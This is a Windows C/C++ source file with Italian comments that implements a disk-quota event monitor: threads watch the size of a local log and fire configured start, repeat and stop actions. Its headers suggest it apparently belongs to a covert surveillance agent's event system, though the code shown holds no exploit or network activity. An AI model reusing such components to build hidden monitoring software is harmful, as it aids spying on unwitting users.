#include <Windows.h>
#include <json/JSON.h>
#include "../common.h"
#include "../bss.h"
#include "../H4-DLL.h"
#include "../SM_Core.h"
#include "../HM_SafeProcedures.h"
#include "../process.h"
#include "../AM_Core.h"
#include "../LOG.h"
#include "../SM_EventHandlers.h"

//----------------------------------------------------
// QUOTA DISCO
typedef struct {
	DWORD disk_quota;
	EVENT_PARAM event_param;
	DWORD event_id;
	BOOL cp;        // semaforo per l'uscita dei thread di controllo
	HANDLE thread_id;
} monitored_quota;

DWORD em_qt_quota_count = 0;
monitored_quota* em_qt_quota_table = NULL;

#define QUOTA_DELAY_INTERVAL 100
#define QUOTA_DELAY_SLEEP    60000
DWORD QuotaMonitorThread(monitored_quota* quota)
{
	DWORD i, log_size;
	BOOL quota_passed = FALSE;

	LOOP{
		log_size = LOG_GetActualLogSize();

		if (log_size > quota->disk_quota) {
			TriggerEvent(quota->event_param.start_action, quota->event_id);
			CreateRepeatThread(quota->event_id, quota->event_param.repeat_action, quota->event_param.count, quota->event_param.delay);
			quota_passed = TRUE;
		}
 else {
  if (quota_passed) {
	  quota_passed = FALSE;
	  StopRepeatThread(quota->event_id);
	  TriggerEvent(quota->event_param.stop_action, quota->event_id);
  }
}

		// -> Sleep(QUOTA_DELAY_SLEEP);
		for (i = 0; i <= QUOTA_DELAY_SLEEP / QUOTA_DELAY_INTERVAL; i++) {
			CANCELLATION_POINT(quota->cp);
			Sleep(QUOTA_DELAY_INTERVAL);
		}

	}

	return 0;
}

#define QUOTA_NEW_TAG 0x20100505
void WINAPI EM_QuotaAdd(JSONObject conf_json, EVENT_PARAM* event_param, DWORD event_id)
{
	typedef struct {
		DWORD disk_quota;
		DWORD tag;
		DWORD exit_event;
	} conf_entry_t;
	conf_entry_t* conf_entry;
	void* temp_table;

	// XXX...altro piccolo ed improbabile int overflow....
	if (!(temp_table = realloc(em_qt_quota_table, (em_qt_quota_count + 1) * sizeof(monitored_quota))))
		return;

	em_qt_quota_table = (monitored_quota*)temp_table;
	em_qt_quota_table[em_qt_quota_count].thread_id = 0;
	em_qt_quota_table[em_qt_quota_count].disk_quota = conf_json[L"quota"]->AsNumber();
	memcpy(&em_qt_quota_table[em_qt_quota_count].event_param, event_param, sizeof(EVENT_PARAM));
	em_qt_quota_table[em_qt_quota_count].event_id = event_id;
	em_qt_quota_table[em_qt_quota_count].cp = FALSE;

	em_qt_quota_count++;
}


void WINAPI EM_QuotaStart()
{
	DWORD i, dummy;
	// Lancia i thread che controllano le quote
	for (i = 0; i < em_qt_quota_count; i++)
		em_qt_quota_table[i].thread_id = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)QuotaMonitorThread, (LPVOID)&em_qt_quota_table[i], 0, &dummy);
}


void WINAPI EM_QuotaStop()
{
	DWORD i;

	// Uccide i thread di controllo e di repeat
	for (i = 0; i < em_qt_quota_count; i++) {
		QUERY_CANCELLATION(em_qt_quota_table[i].thread_id, em_qt_quota_table[i].cp);
		StopRepeatThread(em_qt_quota_table[i].event_id);
	}

	SAFE_FREE(em_qt_quota_table);
	em_qt_quota_count = 0;
}
